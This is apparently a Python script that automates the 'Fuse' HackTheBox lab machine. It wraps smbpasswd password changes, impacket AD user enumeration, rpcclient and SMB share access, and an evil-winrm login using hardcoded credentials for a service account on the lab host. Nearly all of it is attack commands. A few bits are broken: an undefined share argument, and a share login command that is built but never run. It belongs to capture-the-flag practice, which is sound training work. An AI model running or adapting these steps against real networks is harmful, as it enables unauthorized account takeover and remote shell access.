#!/usr/bin/env python3


#Be good and check for missing libs (termcolor, argparse)
try:
    import sys
    import subprocess
    import os
    import argparse
    import string
    import random
    from termcolor import colored
    from time import sleep

    #It's always good to know everything is going well... :)
    print(colored("SUCCESS","green") + " -> All modules imported !\r\n")
    #sleep(0.5)
    os.system('cls' if os.name == 'nt' else 'clear')
except ImportError as e:
    print(colored("ERROR","red") + f" -> {e}\r\n")
    sys.exit(1)

artzy = """

             . . .
              \|/
            `--+--'
              /|\\
             ' | '
               |
               |
           ,--'#`--.
           |#######|
        _.-'#######`-._
     ,-'###############`-.
   ,'#####################`,
  /#########################\\
 |###########################|
|#############################|
|#############################|
|#############################|
|#############################|
 |###########################|
  \#########################/
   `.#####################,'
     `._###############_,'
        `--..#####..--'

"""
def gen_pass(Length=10):
    pass_length = 10
    pass_str = (string.ascii_lowercase + string.ascii_uppercase + string.digits)# only if you choose -> (+ string.punctuation) # Select all necessary chars for password gen
    gened_pass = ''.join(random.sample(pass_str, pass_length))
    return gened_pass

def _rpc_login(USER):
    global HOST
    HOST = "10.10.10.193"

    try:
        cmd1 = f"/bin/rpcclient -U {USER} {HOST}"
        os.system(cmd1)
    except KeyboardInterrupt:
        print(colored("ERROR ", "red") + "-> Interrupt signal captured...")
        sys.exit(1)

def _winrm(USER):
    global HOST
    global PASS

    HOST = "10.10.10.193"
    PASS = "$fab@s3Rv1ce$1"

    try:
        cmd1 = f"/usr/local/bin/evil-winrm -i {HOST} -u {USER} -p {PASS}"
        os.system(cmd1)
    except KeyboardInterrupt:
        print(colored("ERROR ","red") + "-> Interrupt signal captured...")
        sys.exit(1)

def _check_smbshares(USER):
    global HOST
    HOST = "10.10.10.193"

    try:
        cmd1 = f"/bin/smbclient -U {USER} -L //{HOST}/ "
        os.system(cmd1)
    except KeyboardInterrupt:
        print(colored("ERROR ", "red") + "-> Interrupt signal captured...")
        sys.exit(1)

#Create the smbpasswd function to change password of a user
def _change_pass(USER):
    global HOST
    HOST = "10.10.10.193"

    try:
        print(f"Copy/Paste new password twice to verify it -> " + colored(f"{gen_pass(12)}","yellow"))
        print("Old password -> Fabricorp01")
        print("Running smbpasswd for user ->" + colored(f" {USER}","yellow"))
        cmd = f"/bin/smbpasswd -U {USER} -r {HOST}"
        cmd2 = f"/github/impacket/examples/GetADUsers.py -all fabricorp.local/{USER}"
        print('\r\n')
        os.system(cmd)
        os.system(cmd2)
        #_check_smbshares(USER)
        _rpc_login(USER)
    except KeyboardInterrupt:
        print(colored("ERROR ", "red") + "-> Interrupt signal captured...")
        sys.exit(1)

def _login_to_share(USER, SHARE):
    global HOST
    HOST = "10.10.10.193"

    try:
       print("Checking available shares first...")
       print("Running cmd as user: " + colored(f"{USER}","yellow"))
       _check_smbshares(USER)
       cmd1 = f"/bin/smbclient -U {USER} //{HOST}/{SHARE}"
    except KeyboardInterrupt:
        print(colored("ERROR ", "red") + "-> Interrupt signal captured...")
        sys.exit(1)

def parse_args():

    #Print the beautiful art above :)
    print(colored(artzy, "blue"))
    #Setup the argument parser
    parser = argparse.ArgumentParser(description='HackTheBox Fuse box user exploit...')
    parser.add_argument("-u", "--user", help="Username", type=str)
    parser.add_argument("--check_shares", help="Check SMB shares", action="store_true")
    parser.add_argument("--change_pwd", help="Change password of user", action="store_true")
    parser.add_argument("--login_share", help="Login to specified SMB share", action="store_true")
    parser.add_argument("--check_rpc", help="Connect to RPC as user", action="store_true")
    parser.add_argument("--exploit_user", help="Login as svc-print via winrm", action="store_true")
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

    if args.user and args.change_pwd:
        if not args.user:
            print(colored("WARNING", "yellow") + " -> -u/--user must be provided...")
        USER = str(args.user)
        _change_pass(USER)

    if args.exploit_user and args.user:
        if not args.user:
            print(colored("WARNING ", "yellow") + "-> -u/--user must be provided...")
        USER = args.user
        _winrm(USER)

    if args.user and args.check_shares:
        try:
            if not args.user:
                print(colored("WARNING", "yellow") + " -> -u/--user must be provided...")
        except Exception as e:
            e = colored("WARNING", "yellow") + " -> -u/--user must be provided..."
            print(e)
        USER = str(args.user)
        _check_smbshares(USER)

    if args.user and args.check_rpc:
        if not args.user:
            print(colored("WARNING", "yellow") + " -> -u/--user must be provided...")
        USER = args.user
        _rpc_login(USER)

    if args.user and args.login_share:
        if not args.user:
            print(colored("WARNING", "yellow") + " -> -u/--user must be provided...")
        USER = args.user
        SHARE = args.share
        _login_to_share(USER, SHARE)

if __name__ == "__main__":
    try:
        parse_args()
    except Exception as e:
        print(colored("WARNING","yellow") + " -> Something is wrong !...")
        print(colored("ERROR","red") + f" -> {e}")
        sys.exit(1)

